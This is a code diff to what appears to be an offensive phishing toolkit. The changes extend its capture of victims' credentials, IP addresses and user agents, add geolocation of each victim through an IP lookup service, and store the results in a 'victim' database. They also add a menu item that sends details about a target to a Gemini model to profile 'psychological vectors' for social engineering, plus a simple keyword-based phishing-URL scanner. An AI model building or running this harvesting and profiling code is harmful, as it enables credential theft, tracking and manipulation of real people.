@@ -584,6 +584,14 @@ def setup_site():
     shutil.copy2(
         os.path.join(BASE_DIR, ".sites/ip.php"), os.path.join(www_dir, "ip.php")
     )
+    if os.path.exists(os.path.join(BASE_DIR, ".sites/awareness.php")):
+        shutil.copy2(
+            os.path.join(BASE_DIR, ".sites/awareness.php"), os.path.join(www_dir, "awareness.php")
+        )
+    if os.path.exists(os.path.join(BASE_DIR, ".sites/validation.js")):
+        shutil.copy2(
+            os.path.join(BASE_DIR, ".sites/validation.js"), os.path.join(www_dir, "validation.js")
+        )
 
     php_bin = shutil.which("php") or shutil.which("php.exe")
     if not php_bin:
@@ -608,10 +616,26 @@ def capture_ip(silent=False):
     if os.path.exists(ip_file):
         with open(ip_file, "r") as f:
             lines = f.readlines()
-        ip = ""
+        ip = "Unknown"
+        ua = "Unknown"
+        location = "Unknown"
         for line in lines:
             if "IP: " in line:
                 ip = line.split("IP: ")[1].strip()
+            if "User-Agent: " in line:
+                ua = line.split("User-Agent: ")[1].strip()
+
+        # Location lookup
+        if ip and ip != "Unknown" and ip not in ["127.0.0.1", "::1"]:
+            try:
+                import json, urllib.request
+                req = urllib.request.Request(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=3) as response:
+                    data = json.loads(response.read().decode())
+                    if data.get("status") == "success":
+                        location = f"{data.get('city', '')}, {data.get('country', '')}".strip(', ')
+            except Exception:
+                pass
 
         if not silent:
             slow_type(
@@ -648,7 +672,7 @@ def capture_ip(silent=False):
             print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}", end="", flush=True)
 
         # Save to SQLite for Dashboard
-        database.add_victim(website, "IP_ONLY", "N/A", ip)
+        database.add_victim(website, "IP_ONLY", "N/A", ip, ua, location)
         
         # Notify Dashboard
         try:
@@ -676,13 +700,29 @@ def capture_creds(silent=False):
 
         # Extract IP from ip.txt if available, else N/A
         ip = "Unknown"
+        ua = "Unknown"
+        location = "Unknown"
         auth_ip_file = os.path.join(BASE_DIR, "auth/ip.txt")
         if os.path.exists(auth_ip_file):
             with open(auth_ip_file, "r") as f:
-                last_lines = f.readlines()[-5:]
+                last_lines = f.readlines()[-10:]
                 for l in last_lines:
                     if "IP: " in l:
                         ip = l.split("IP: ")[1].strip()
+                    if "User-Agent: " in l:
+                        ua = l.split("User-Agent: ")[1].strip()
+
+        # Location lookup
+        if ip and ip != "Unknown" and ip not in ["127.0.0.1", "::1"]:
+            try:
+                import json, urllib.request
+                req = urllib.request.Request(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=3) as response:
+                    data = json.loads(response.read().decode())
+                    if data.get("status") == "success":
+                        location = f"{data.get('city', '')}, {data.get('country', '')}".strip(', ')
+            except Exception:
+                pass
 
         if not silent:
             slow_type(
@@ -719,7 +759,7 @@ def capture_creds(silent=False):
         if silent:
             print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}", end="", flush=True)
 
-        database.add_victim(website, account, password, ip)
+        database.add_victim(website, account, password, ip, ua, location)
 
         # Notify Dashboard
         try:
@@ -1249,6 +1289,8 @@ def main_menu():
     {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_CYAN, RGB_PURPLE)}
     {gradient_text("    [16] AI Phishing Assistant      [ NEW ]", RGB_CYAN, RGB_PURPLE)}
     {gradient_text("    [17] Open Web Dashboard         [ LIVE ]", RGB_PURPLE, RGB_CYAN)}
+    {gradient_text("    [18] Phishing Link & QR Scanner [ NEW ]", RGB_CYAN, RGB_PURPLE)}
+    {gradient_text("    [19] Deep Social AI Profiler    [ EXP ]", RGB_PURPLE, RGB_CYAN)}
     {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_PURPLE, RGB_CYAN)}
 
     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
@@ -1317,6 +1359,11 @@ def main_menu():
         ai_assistant_menu()
     elif reply in ["17"]:
         show_dashboard_info(from_attack=False)
+        main_menu()
+    elif reply in ["18"]:
+        scanner_menu()
+    elif reply in ["19"]:
+        social_ai_menu()
     elif reply in ["99"]:
         about()
     elif reply in ["0", "00"]:
@@ -1368,6 +1415,98 @@ def ai_assistant_menu():
     print()
     loading_animation(4, "AI is thinking")
     result = ai_assistant.generate_templates(platform_name, scenario)
+
+    print(
+        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
+    )
+    slow_type(result, speed=0.005, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    print(
+        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
+    )
+
+    input(f"\n    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} to return to main menu...")
+    main_menu()
+
+def scanner_menu():
+    os.system("cls" if os.name == "nt" else "clear")
+    banner_small()
+    print(f"\n    {gradient_text('━━━━━━━━━━ PHISHING LINK & QR SCANNER ━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}")
+    slow_type("    [!] This module analyzes links/QR URLs for phishing indicators.", speed=0.01, start_rgb=RGB_CYAN, end_rgb=RGB_WHITE)
+    print()
+    url = slow_input(f"    {DARK}[{WHITE}-{DARK}]{PURPLE} Enter URL to Scan : {LIGHT1}", start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    
+    if not url: return
+
+    loading_animation(3, "Analyzing URL heuristics")
+    
+    suspicious_keywords = ["free", "verify", "secure", "login", "update", "account", "billing", "gift", "prize", "tiktok-followers"]
+    score = 0
+    reasons = []
+    
+    if url.startswith("http://"):
+        score += 30
+        reasons.append("Connection is not secure (HTTP instead of HTTPS).")
+    
+    if len(url) > 75:
+        score += 20
+        reasons.append("URL is unusually long, common in obfuscated phishing links.")
+        
+    for kw in suspicious_keywords:
+        if kw in url.lower():
+            score += 15
+            reasons.append(f"Contains suspicious keyword: '{kw}'.")
+            
+    if url.count('-') > 3:
+        score += 20
+        reasons.append("High number of hyphens, typical of typosquatting domains.")
+        
+    print(f"\n    {gradient_text('━━━━━━━━━━ SCAN RESULTS ━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}")
+    print(f"    {LIGHT2}Target: {WHITE}{url}")
+    
+    if score >= 50:
+        slow_type(f"    [!] VERDICT: MALICIOUS / HIGH RISK", speed=0.01, start_rgb=RGB_PINK, end_rgb=RGB_RED)
+    elif score >= 20:
+        slow_type(f"    [!] VERDICT: SUSPICIOUS / MEDIUM RISK", speed=0.01, start_rgb=RGB_PURPLE, end_rgb=RGB_PINK)
+    else:
+        slow_type(f"    [+] VERDICT: CLEAN / LOW RISK", speed=0.01, start_rgb=RGB_CYAN, end_rgb=RGB_BLUE)
+        
+    if reasons:
+        print(f"\n    {LIGHT2}Detected Indicators:{WHITE}")
+        for r in reasons:
+            print(f"    {DARK}- {WHITE}{r}")
+            
+    print(f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}")
+    input(f"\n    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} Press Enter to return to main menu...")
+    main_menu()
+
+def social_ai_menu():
+    os.system("cls" if os.name == "nt" else "clear")
+    banner_small()
+    glitch_print(
+        " --- DEEP SOCIAL AI PROFILER --- ",
+        duration=0.5,
+        start_rgb=RGB_PINK,
+        end_rgb=RGB_WHITE,
+    )
+
+    if not ai_assistant.setup_ai():
+        print(f"\n    {DARK}[{WHITE}!{DARK}]{RED} Gemini API Key not found!")
+        key = input(
+            f"    {DARK}[{WHITE}-{DARK}]{LIGHT2} Please enter your Gemini API Key: {WHITE}"
+        )
+        if key:
+            ai_assistant.save_api_key(key)
+        else:
+            main_menu()
+            return
+
+    target_info = input(
+        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Enter Target Info (username, bio, traits): {WHITE}"
+    )
+
+    print()
+    loading_animation(4, "Analyzing psychological vectors")
+    result = ai_assistant.analyze_social_profile(target_info)
 
     print(
         f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
